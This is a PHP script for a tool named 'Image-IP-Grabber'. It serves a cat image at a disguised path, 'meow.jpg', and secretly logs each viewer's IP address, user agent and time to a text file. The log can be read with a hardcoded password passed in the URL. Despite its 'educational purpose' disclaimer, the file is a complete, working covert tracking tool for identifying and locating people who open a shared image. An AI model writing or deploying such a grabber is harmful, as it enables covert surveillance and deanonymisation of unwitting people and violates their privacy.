<?php
/*  Project: Image-IP-Grabber
 *  Developed by: Anikin Luke
 *
 *  Disclaimer: 
 *  - This project is for educational and demonstration purpose only.
 *  - Any misuse or unlawful use of this project is beyond the responsibility of the developer.
*/

function logIpAddress($filename) {
    date_default_timezone_set('Asia/Manila');
    $timestamp = date('m/d/Y h:i:s a', time());
    $user_agent = $_SERVER["HTTP_USER_AGENT"];
    $ip_address = $_SERVER["REMOTE_ADDR"];

    // Check if the log file exists, if not, create it
    if (!file_exists($filename)) {
        $ips_logs = fopen($filename, "w");
        fclose($ips_logs);
    }

    // Append the IP address log to the file
    $ips_logs = fopen($filename, "a");
    $content = "";
    $content .= "===============[$timestamp]===============\n";
    $content .= "User-Agent: $user_agent\n";
    $content .= "IP Address: $ip_address\n";

    fwrite($ips_logs, $content);
    fclose($ips_logs);
}

$url_path  = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
$current_file = basename($url_path);
$log_file = "ip_logs.txt";        // Change this to your desired log filename
$is404 = True;

if ($current_file === "meow.jpg")  // You can change meow.jpg to any name you want.
{  
    logIpAddress($log_file);
    $is404 = False;                   // To prevent the execution of the 404 page condition below.
    $file = './assets/cute_cat.png';  // Make sure image file/path you put here exists in your directory.
    $type = 'image/jpeg';             // MIME type to represent an image file.

}
elseif ($current_file === $log_file)
{
    /* Add password when viewing log file to 
    prevent anyone from viewing your logs. */
    $password = $_GET["p"] ?? '';
    if($password === "mypassword123") // Change the 'mypassword123' to your desired password.
    {
        $is404 = False;               // To prevent the execution of the 404 page condition below.
        $file = $log_file;
        $type = "text/plain";        // MIME type to represent a text file.
    }
}

/* Return a 404 page if none 
of the conditions above are met. */
if($is404)
{
    http_response_code(404);
    include("./assets/404.html");
    exit;
}

// MEOW
header('Content-Type: ' . $type);
header('Content-Length: ' . filesize($file));
readfile($file);

?>
